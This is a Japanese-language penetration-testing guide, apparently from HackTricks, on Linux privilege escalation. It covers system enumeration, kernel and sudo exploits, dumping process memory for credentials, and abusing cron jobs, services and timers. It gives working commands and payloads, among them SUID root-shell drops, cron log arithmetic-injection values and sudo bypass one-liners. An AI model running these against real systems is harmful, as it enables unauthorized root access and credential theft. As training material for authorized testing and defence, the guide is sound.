# Linux 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報の収集から始めます。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH`変数内のいずれかのフォルダに**書き込み権限がある**場合、一部のライブラリやバイナリを hijack できる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API キーがありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、権限昇格に使用できる exploit が存在するか確認します
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱な kernel の一覧と、すでに **compiled exploits** されたものは、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
その他、**compiled exploits** を入手できるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のように実行します:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits の検索に役立つツール：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者マシン上で実行。kernel 2.x の exploits のみチェック）

常に **kernel version を Google で検索**してください。kernel version が何らかの kernel exploit に記載されている場合があり、その exploit が有効であることを確認できます。

Additional kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoバージョン

以下に記載されている脆弱なsudoバージョンに基づくと：
```bash
searchsploit sudo
```
この grep を使用して、sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルがユーザー管理下のディレクトリから使用される場合、権限のないローカルユーザーが sudo の `--chroot` オプションを介して root に権限昇格できます。<sup>[[28]](#references)[[29]](#references)</sup>

この [脆弱性](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を悪用する [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) があります。exploit を実行する前に、使用している `sudo` のバージョンが脆弱であり、`chroot` feature に対応していることを確認してください。

詳細については、元の [脆弱性アドバイザリ](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)<sup>[[28]](#references)</sup> を参照してください。

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 より前の Sudo（報告されている影響範囲：**1.8.8–1.9.17**）では、`sudo -h <host>` で指定された**ユーザー提供の hostname** を使用して host-based sudoers rules を評価し、**実際の hostname** を使用しない場合があります。sudoers が別の host 上でより広範な権限を付与している場合、その host をローカルで **spoof** できます。<sup>[[29]](#references)</sup>

Requirements:
- 脆弱な sudo バージョン
- Host-specific sudoers rules（host が現在の hostname でも `ALL` でもないこと）

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可されたホストを spoofing して exploit：
```bash
sudo -h devbox id
sudo -h devbox -i
```
偽装した名前の解決がブロックする場合は、`/etc/hosts` に追加するか、DNS lookupを回避するために、ログやconfigsにすでに表示されているhostnameを使用します。

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗

この脆弱性がどのように exploit される可能性があるかの**例**については、**HTB の smasher2 box**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SELinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

コンテナ内にいる場合は、まず以下の container-security セクションを確認し、その後 runtime-specific abuse ページへ pivot します:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

**何がマウントおよびアンマウントされているか**、その場所と理由を確認します。何かがアンマウントされている場合は、それをマウントして private info を確認してみます
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploitを使用する必要がある場合に役立ちます。使用するマシン上（またはそれに類似した環境）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされている脆弱なソフトウェア

**インストールされているパッケージとサービスのバージョン**を確認します。権限昇格に悪用できる、古い Nagios のバージョンなどが存在する可能性があります…\
より疑わしいインストール済みソフトウェアについては、手動でバージョンを確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンへの SSH access がある場合は、**openVAS** を使用して、マシン内にインストールされている outdated で vulnerable な software をチェックすることもできます。

> [!NOTE] > _これらの commands では、ほとんど役に立たない大量の情報が表示されるため、インストールされている software の version が既知の exploits に対して vulnerable かどうかをチェックする OpenVAS などの applications を使用することを推奨します_

## Processes

**どの processes** が実行されているかを確認し、いずれかの process が本来持つべき以上の **privileges** を持っていないかチェックします（たとえば、root によって tomcat が実行されている場合など）。
```bash
ps aux
ps -ef
top -n 1
```
常に、実行中の[**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限を昇格できる可能性があります。**Linpeas**は、プロセスのコマンドライン内にある`--inspect`パラメータを確認することで、これらを検出します。\
また、**プロセスのバイナリに対する自分の権限も確認**してください。他のユーザーが使用しているものを上書きできる可能性があります。

### ユーザー間の親子プロセスチェーン

親プロセスとは**異なるユーザー**で実行されている子プロセスが、必ずしも悪意のあるものとは限りません。しかし、これは有用な**triage signal**です。いくつかの遷移は想定されたものです（`root`がサービスユーザーを起動する、login managerがセッションプロセスを作成するなど）。一方で、通常とは異なるチェーンから、wrapper、debug helper、永続化、または脆弱なruntime trust boundaryが明らかになる場合があります。

簡単な確認：
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
予想外の chain を見つけた場合は、親の command line と、その動作に影響を与えるすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、writable arguments）を調査してください。実際の privesc path では、child 自体は writable ではなくても、**parent-controlled config** や helper chain が writable であるケースが複数ありました。

### 削除された実行ファイルと削除後も開かれているファイル

Runtime artifacts は、**削除後も**アクセスできる場合があります。これは privilege escalation だけでなく、すでに機密ファイルを開いているプロセスから証拠を復元する場合にも役立ちます。

削除された実行ファイルを確認します：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上の古い binary image を実行し続けています。これは調査すべき強い signal です。理由は次のとおりです。

- 削除された executable に興味深い strings や credentials が含まれている可能性がある
- 実行中の process が有用な file descriptors を引き続き公開している可能性がある
- 削除された privileged binary は、最近の tampering または cleanup の試みを示している可能性がある

グローバルに削除済みの open files を収集します：
```bash
lsof +L1
```
興味深いディスクリプタを見つけた場合は、直接取得します：
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除済みの secret、script、database export、または flag file を開いたままの場合に、特に有用です。

### プロセス監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用して、プロセスを監視できます。これは、頻繁に実行される脆弱なプロセスや、一定の要件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

### プロセスメモリ

一部のサーバーサービスは、**認証情報をメモリ内に平文で保存**します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには **root privileges** が必要です。そのため、これは通常、すでに root であり、さらに認証情報を発見したい場合に役立ちます。\
ただし、**通常のユーザーでも、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 最近のほとんどのマシンでは、**デフォルトで ptrace が許可されていない**ため、unprivileged user に属する他のプロセスを dump できないことに注意してください。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは、ptrace のアクセス可能性を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid である限り、すべてのプロセスを debug できます。これは ptrace が動作していた従来の方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみ debug できます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、admin のみ ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でプロセスを trace できません。一度設定すると、再び ptrace を有効にするには reboot が必要です。

#### GDB

FTP service などのメモリにアクセスできる場合、その Heap を取得し、内部を検索して認証情報を探すことができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem** pseudo file は**プロセスのメモリそのものを公開**します。**maps** file から、**読み取り可能なメモリ領域**とそのオフセットが分かります。この情報を使用して、**mem file 内を seek し、読み取り可能なすべての領域を** file に dump します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理メモリ**へのアクセスを提供します。仮想メモリへのアクセスではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows向けSysinternals suite of toolsに含まれる従来のProcDump toolをLinux向けに再構想したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリを dump するには、以下を使用できます：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除し、自分が所有するプロセスを dump できます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスのメモリから取得した認証情報

#### 手動での例

authenticator プロセスが実行されていることが分かった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を窃取**し、一部の**よく知られたファイル**からも取得します。正常に動作するには root 権限が必要です。

| 機能                                             | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop、Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop、ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Web の「Crontab UI」パネル（alseambusher/crontab-ui）が root として実行され、loopback のみに bind されている場合でも、SSH の local port-forwarding 経由でアクセスし、privileged job を作成して escalation できます。<sup>[[1]](#references)[[4]](#references)</sup>

Typical chain
- `ss -ntlp` / `curl -v localhost:8000` を使用して、loopback のみに bind された port（例：127.0.0.1:8000）と Basic-Auth realm を確認する
- operational artifacts から credentials を探す：
- `zip -P <password>` を含む Backups/scripts
- `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- Tunnel を作成して login する：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即座に実行（SUID shellをドロップ）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する：
```bash
/tmp/rootshell -p   # root shell
```
強化
- Crontab UI を root として実行せず、専用ユーザーと最小限の権限で制限する
- localhost に bind し、さらに firewall/VPN でアクセスを制限する。パスワードを再利用しない
- unit files に secrets を埋め込まない。secret stores または root のみが読み取り可能な EnvironmentFile を使用する
- on-demand job の実行に対する audit/logging を有効にする

脆弱な scheduled job がないか確認する。root によって実行される script を利用できる可能性がある（wildcard vuln? root が使用するファイルを変更できるか？ symlinks を使用できるか？ root が使用する directory に特定のファイルを作成できるか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` が使用されている場合、実際に実行される名前を確認する：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これにより、false positives を回避できます。書き込み可能な periodic directory は、payload のファイル名がローカルの `run-parts` のルールに一致する場合にのみ役立ちます。

### Cron path

たとえば、_/etc/crontab_ 内には PATH があります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー "user" が /home/user に対する書き込み権限を持っていることに注目してください）

この crontab 内で、root ユーザーが path を設定せずにコマンドやスクリプトを実行しようとした場合。例: _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを使用するスクリプトを実行する Cron（Wildcard Injection）

root によってスクリプトが実行され、そのコマンド内に「**\***」が含まれている場合、これを悪用して予期しないこと（privesc など）を実行できる可能性があります。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードの前に** _**/some/path/\***_ **のようなパスが付いている場合、脆弱ではありません（**_**./\***_ **でさえも同様です）。**

ワイルドカードの exploitation tricks については、以下のページを参照してください:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash は、`((...))`、`$((...))`、`let` における arithmetic evaluation の前に、parameter expansion と command substitution を実行します。root cron/parser が信頼できない log field を読み取り、それを arithmetic context に渡す場合、攻撃者は command substitution `$(...)` を注入でき、cron の実行時に root 権限で実行されます。<sup>[[22]](#references)</sup>

- 動作する理由: Bash では、expansion は次の順序で行われます: parameter/variable expansion、command substitution、arithmetic expansion、word splitting、pathname expansion。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は、最初に substitution されて command が実行され、その後、残った数値 `0` が arithmetic に使用されるため、script はエラーなしで続行されます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に攻撃者が制御するテキストを書き込み、numeric-looking field に command substitution を含め、digit で終わるようにします。arithmetic が有効なままになるよう、command が stdout に出力しないこと（または redirect すること）を確認します。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される cron script を**変更できる場合**、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるスクリプトが、**完全なアクセス権を持つディレクトリ**を使用している場合、そのフォルダを削除し、あなたが制御するスクリプトを配置した別のフォルダへの**シンボリックリンクを作成**すると役立つ可能性があります。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### シンボリックリンクの検証とより安全なファイル処理

パスを指定してファイルを読み書きする特権スクリプトやバイナリをレビューする際は、リンクの処理方法を確認します。

- `stat()` はシンボリックリンクを追跡し、対象のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は、最終的な対象を解決し、各パスコンポーネントのパーミッションを表示するのに役立ちます。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defenders/developers 向けに、symlink tricks に対するより安全なパターンには以下があります。

- `O_EXCL` と `O_CREAT`: path がすでに存在する場合は失敗する（攻撃者が事前に作成した links/files をブロック）。
- `openat()`: 信頼できる directory file descriptor を基準に操作する。
- `mkstemp()`: secure permissions を使用して temporary files をアトミックに作成する。

### writable payloads を持つ Custom-signed cron binaries

Blue teams は、cron-driven binaries を実行する前に、custom ELF section を dump し、vendor string を grep することで、root として実行される binary に「sign」することがあります。その binary が group-writable（例: `root:devs 770` が所有する `/opt/AV/periodic-checks/monitor`）で、さらに signing material を leak できる場合、section を偽造して cron task を hijack できます:<sup>[[2]](#references)</sup>

1. `pspy` を使用して verification flow をキャプチャします。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後に `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してから file を実行していました。
2. leak した key/config（`signing.zip` 由来）を使用して、期待される certificate を再作成します。
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious replacement（例: SUID bash を配置する、SSH key を追加する）を build し、certificate を `.text_sig` に埋め込んで grep を通過させます。
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits を保持したまま scheduled binary を上書きします。
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron run を待ちます。naive signature check が成功すると、payload が root として実行されます。

### Frequent cron jobs

プロセスを monitor して、1、2、または 5 分ごとに実行されている processes を探せます。利用して privileges を escalate できる可能性があります。

たとえば、**1 分間、0.1 秒ごとに monitor**し、**実行回数の少ない commands 順に sort**して、実行回数が最も多い commands を削除するには、次のように実行します。
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次も使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（開始するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root backups（pg_basebackup）

root-owned cron が、書き込み可能な database directory に対して `pg_basebackup`（または任意の recursive copy）を実行する場合、**SUID/SGID binary** を配置できます。この binary は、同じ mode bits のまま **root:root** 所有として backup output に再コピーされます。<sup>[[26]](#references)</sup>

Typical discovery flow（low-priv DB user として）:
- `pspy` を使用して、毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを呼び出す root cron を見つけます。
- source cluster（例: `/var/lib/postgresql/14/main`）に自分が書き込み可能であり、job の実行後に destination（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` がクラスタのコピー時にファイルモードビットを保持するために機能します。root によって実行されると、保存先のファイルは **root の所有権 + 攻撃者が選択した SUID/SGID** を継承します。権限を保持し、実行可能な場所に書き込む、同様の特権バックアップ/コピー処理ルーチンには脆弱性があります。

### 見えない cron jobs

**コメントの後に改行文字を付けず、キャリッジリターンを置く**ことで、cronjob を作成できます。この cron job は正常に動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種のステルスな侵入を検出するには、制御文字を表示できるツールで cron ファイルを調査します。
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合、サービスが**開始**、**再起動**、または**停止**されたときに**バックドアを実行**するよう、ファイルを**変更**できます（マシンが再起動されるまで待つ必要がある場合があります）。\
例えば、**`ExecStart=/tmp/script.sh`** を使って、.service ファイル内にバックドアを作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限**がある場合、それらをバックドア用に変更できます。そうすると、サービスが再実行されたときにバックドアが実行されます。

### systemd PATH - 相対パス

以下を使用して、**systemd** が使用する PATH を確認できます。
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**が可能であれば、**権限昇格**できる可能性があります。次のような**サービス設定**ファイルで使用されている**相対パス**を探す必要があります：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと**同じ名前の実行可能ファイル**を作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**backdoor が実行されます**（通常、権限のないユーザーはサービスを start/stop できませんが、`sudo -l` を使用できるか確認してください）。

**`man systemd.service` でサービスについて詳しく学べます。**

## **Timers**

**Timers** は、名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルまたはイベントを制御します。**Timers** は cron の代替として使用できます。カレンダー時刻イベントと単調時刻イベントを標準でサポートしており、非同期で実行できます。

次のコマンドですべての timer を列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

timer を変更できる場合、systemd.unit に存在するもの（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unit について次のように説明されています。

> この timer が経過したときに activate する Unit。引数は Unit 名で、サフィックスは ".timer" ではありません。指定されていない場合、この値は timer unit と同じ名前（サフィックスを除く）を持つ service にデフォルト設定されます。（上記を参照。）activate される Unit 名と timer unit の名前は、サフィックスを除いて同一にすることが推奨されています。

したがって、この permission を abuse するには、次のことを行う必要があります。

- **writable な binary を実行している** systemd unit（`.service` など）を見つける
- **relative path を実行しており**、その **systemd PATH** に対する **writable privileges** を持つ systemd unit を見つける（その executable になりすますため）

**`man systemd.timer` で timers の詳細を確認できます。**

### **Enabling Timer**

timer を enable するには root privileges が必要で、次を実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`**timer**`は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`へのsymlinkを作成することで**activated**される点に注意してください。

## Sockets

Unix Domain Sockets（UDS）は、client-serverモデル内で同一または異なるマシン上の**process communication**を可能にします。コンピューター間通信には標準的なUnix descriptor filesを使用し、`.socket`ファイルを通じて設定されます。<sup>[[14]](#references)</sup>

Socketsは`.socket`ファイルを使用して設定できます。

**`man systemd.socket`でSocketsについて詳しく学べます。** このファイル内では、いくつかの興味深いparameterを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのoptionはそれぞれ異なりますが、socketが**どこでlistenするかを示す**ために使用されます（AF_UNIX socket fileのpath、listenするIPv4/6やport numberなど）。
- `Accept`: boolean argumentを受け取ります。**true**の場合、**incoming connectionごとにservice instanceがspawnされ**、connection socketのみが渡されます。**false**の場合、すべてのlistening sockets自体が**started service unitに渡され**、すべてのconnectionに対してservice unitが1つだけspawnされます。この値はdatagram socketsとFIFOsでは無視され、単一のservice unitがすべてのincoming trafficを無条件に処理します。**デフォルトはfalse**です。performance上の理由から、新しいdaemonは`Accept=no`に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`、`ExecStartPost`: 1つ以上のcommand lineを受け取り、それぞれlistening **sockets**/FIFOsが**created**およびboundされる**前**または**後**に**実行されます**。command lineの最初のtokenはabsolute filenameでなければならず、その後にprocessのargumentsが続きます。
- `ExecStopPre`、`ExecStopPost`: listening **sockets**/FIFOsが**closed**およびremovedされる**前**または**後**に**実行される**追加の**commands**です。
